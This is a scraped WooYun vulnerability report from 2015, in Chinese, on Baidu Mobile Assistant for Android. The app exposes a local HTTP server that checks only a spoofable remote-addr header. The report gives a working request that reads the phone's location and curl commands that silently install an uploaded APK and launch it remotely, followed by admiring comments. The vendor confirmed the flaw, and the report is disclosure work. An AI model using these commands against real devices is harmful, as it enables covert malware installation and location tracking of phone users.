{"id": 73349, "wybug_id": "wooyun-2015-0145718", "wybug_title": "百度手机助手远程静默安装启动应用漏洞(3G/4G环境下远程种马)", "wybug_corp": "百度", "wybug_author": "瘦蛟舞", "wybug_date": "2015-10-10 11:25", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 漏洞承接自http://www.wooyun.org/bugs/wooyun-2015-0145365 详细说明：  \n» droidportPackage                  Proto Recv-Q Send-Q         Local Address          Foreign Address        Statecom.baidu.appsearch tcp6       0      0 :::40310               :::*                   LISTENcom.baidu.appsearch tcp6       0      0 :::7777                :::*                   LISTEN\n发现百度手机助手监听40310这么奇怪的端口,这里7777先按下不表.前面的分析和 WooYun: 百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标） 差不多根据端口号找到 nano http server 的实现\n\n但是和之前不一样的是多了一些验证,比如 http 头部remote-addr字段的验证\n\n因为之前分析过百度输入法的 http server 所以很多结果就可以直接使用,比如获取目标坐标/IMEI/安装应用/远程发送 intent 等\n\n获取坐标,其他信息获取可以参考 WooYun: 百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标） \nGET /geolocation?callback=012&mcmdf=inapp_aa HTTP/1.1Host: 192.168.1.102:40310Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://m.baidu.com/remote-addr: 127.0.0.1Connection: keep-alive\n但是其中又多了一些让人感兴趣的接口,比如uploadfile听着向上传文件,追踪下此调用类的实现看看到底在干什么.\n\n从代码中可以看出这是这个接收文件的操作,和类的命令很一直了.但是继续跟踪其对install_type操作判断后的处理会发现.还有一个令人虎躯一震的功能 静默安装. (一般手机助手都会有一个静默安装功能是需要 root 权限的,这样可以帮助用户省去点击安装的操作.)\n\n我们是否可以利用这个功能达到远程恶意安装应用的目的了而且加上远程发送 intent 的功能,不仅定向安装了应用而且攻击者可以随时随地启动应用.   漏洞证明：  远程上传静默安装应用curl -F file=@1.apk -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.10.127:40310/uploadfile?install_type=all&callback=123&mcmdf=inapp_123&Filename=1.apk&远程启动应用curl -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.10.127:40310/sendintent?callback=123&mcmdf=inapp_123&intent=intent:#Intent;component=org.wooyun.wifikey/org.wooyun.wifikey.MainActivity;end;&urlencodecurl -e http://m.baidu.com -H \"remote-addr: 127.0.0.1\" http://192.168.10.127:40310/sendintent?callback=123&mcmdf=inapp_123&intent=intent%3A%23Intent%3Bcomponent%3Dorg.wooyun.wifikey%2forg.wooyun.wifikey.MainActivity%3Bend%3B&关于对 3/4G 网络扫描攻击可以参考 WooYun: 百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标） 以及小荷才露尖尖角的文章http://drops.wooyun.org/mobile/6973.等俺有测试卡了俺就扩大范围测测,嘿嘿.注意视频中 wifikey 是 curl 后突然冒出来并启动的哟~   修复方案：     版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-10 11:50 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-10 11:27 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1628 漏洞数:188        | 新年快乐！)\t\t \n  好久没看瘦师傅发力了    \n     2015-10-10 11:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:20        | 当我又回首一切,这个世界会好吗?)\t\t \n  @梧桐雨 路人甲是你师父？    \n     2015-10-10 11:35 |    \t\tphith0n  \t\t\t( 普通白帽子  |\t\t\t        Rank:718 漏洞数:114        | 一个想当文人的黑客~)\t\t \n  @xsser 咦，不是瘦师傅发的么！！    \n     2015-10-10 11:36 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1628 漏洞数:188        | 新年快乐！)\t\t \n  @xsser 这也行？！    \n     2015-10-10 11:40 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  马克啊    \n     2015-10-10 11:44 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  以后不能说蜂窝网络里面就是安全的了    \n     2015-10-10 11:48 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:473 漏洞数:51        | 我有一个好想法！)\t\t \n  屌的飞起!    \n     2015-10-10 11:49 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:696 漏洞数:73        | root@qisec.com)\t\t \n  卧槽  前排    \n     2015-10-10 11:49 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2942 漏洞数:582        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  屌的起飞!    \n     2015-10-10 11:50 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1278 漏洞数:128        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  真叼    \n     2015-10-10 12:26 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:63        | 潜心代码审计。)\t\t \n  卧槽还能转路人甲？！    \n     2015-10-10 12:46 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:79        | 潜心学习~~~)\t\t \n  请问像师傅这么叼的，还有朋友吗？^-^    \n     2015-10-10 13:17 |    \t\tsecmap \t\t\t( 普通白帽子  |\t\t\t        Rank:1293 漏洞数:200        )\t\t \n  so屌...    \n     2015-10-10 13:41 |    \t\t小荷才露尖尖角 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:14        | less is more)\t\t \n  瘦瘦发力了！    \n     2015-10-10 14:01 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:738 漏洞数:93        | 没关系啊，我们还有音乐)\t\t \n  关注！    \n     2015-10-10 14:22 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:37        | 勿忘初心)\t\t \n  犀利    \n     2015-10-10 14:25 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  大V们都冒出来了    \n     2015-10-10 14:28 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-10-10 14:34 |    \t\t梧桐树下 \t\t\t( 普通白帽子  |\t\t\t        Rank:553 漏洞数:89        | 一大波洞正在过来……)\t\t \n  爽翻！    \n     2015-10-10 14:58 |    \t\t小不点 \t\t\t( 核心白帽子 |\t\t\t        Rank:1123 漏洞数:119        | 生命不息，刷洞不止.....)\t\t \n  mark    \n     2015-10-10 15:14 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:13        | 我是一颗小小树)\t\t \n  @啊L川  乌云的短消息提示大贴心了，只要关注就行了    \n     2015-10-10 15:20 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  屌炸天    \n     2015-10-10 16:15 |    \t\t封停 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        | 求老中医指路)\t\t \n  屌的飞起~    \n     2015-10-11 15:27 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:195        | 。)\t\t \n  以后不能说蜂窝网络里面就是安全的了    \n     2015-10-13 14:22 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:346 漏洞数:92        | http://www.tomatoyu.com/)\t\t \n  以后不能说蜂窝网络里面就是安全的了    \n     2015-10-13 15:44 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  马克    \n     2015-10-13 16:57 |    \t\tComer \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:40        | 关注安全 | 关注智能漏洞挖掘)\t\t \n  尼玛    \n     2015-10-15 10:17 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区枫叶正...)\t\t \n  叼，关注乌云微信，安全生活每一天。    \n     2015-10-27 23:02 |    \t\t指尖的温度 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:10        )\t\t \n  哎呀wocaowocao，丧(gan)心(de)病(piao)狂(liang)    \n     2016-01-12 11:45 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  diao的不要不要的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}